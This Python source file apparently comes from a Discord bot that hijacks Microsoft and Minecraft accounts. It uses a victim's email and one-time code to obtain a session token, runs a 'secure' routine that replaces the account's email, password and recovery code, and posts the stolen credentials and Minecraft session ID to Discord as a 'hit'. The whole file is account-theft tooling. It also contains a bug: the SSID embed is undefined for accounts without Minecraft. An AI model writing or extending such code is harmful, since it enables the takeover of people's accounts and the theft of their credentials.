from views.utils.getMSAAUTH import getMSAAUTH

from views.utils.securing.getLiveData import getLiveData
# from views.utils.securing.getWLSSC import getWLSSC
from views.utils.securing.secure import secure

from discord import Embed

import time

async def startSecuringAccount(email: str, device: str = None, code: str = None):
    
    data = await getLiveData() # {urlPost, ppft, cookies, headers}

    msaauth = await getMSAAUTH(email, device, data, code)
    print(f"\nMSAAUTH VALUE: {msaauth}\ns")
    
    if not msaauth:
        print("[-] - Failed to get MSAAUTH | Invalid OTP Code")
        return None
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    initialTime = time.time()
    account = await secure(msaauth)
    print(account)

    finalTime = (time.time() - initialTime)

    infoEmbed = Embed()

    infoEmbed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
    infoEmbed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
    infoEmbed.add_field(name="Full Name", value=f"```{account['fullName']}```", inline=False)
    infoEmbed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
    infoEmbed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)

    hitEmbed = Embed(
        title = f"Took {round(finalTime, 2)} seconds securing!",
        color = 0xE4D00A
    )

    # Once primaryEmail is done oldEmail -> Email
    hitEmbed.add_field(name="MC Username", value=f"```{account['oldName']}```", inline=False)
    hitEmbed.add_field(name="MC Method", value=f"```{account['method']}```", inline=True)
    hitEmbed.add_field(name="MC Capes", value=f"```{account['capes']}```", inline=True)
    hitEmbed.add_field(name="Old Email", value=f"```{account['oldEmail']}```", inline=False)
    hitEmbed.add_field(name="New Email", value=f"```{account['email']}```", inline=False)
    hitEmbed.add_field(name="Security Email", value=f"```{account['secEmail']}```", inline=True)
    hitEmbed.add_field(name="Password", value=f"```{account['password']}```", inline=False)
    hitEmbed.add_field(name="Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)

    if account["method"] != "No Minecraft":
        
        ssidEmbed = Embed()
        ssidEmbed.add_field(name="**SSID**", value=f"```{account['SSID']}```", inline=False)

        ssidEmbed.color = 0x50C878


    return [
        hitEmbed,
        ssidEmbed
    ]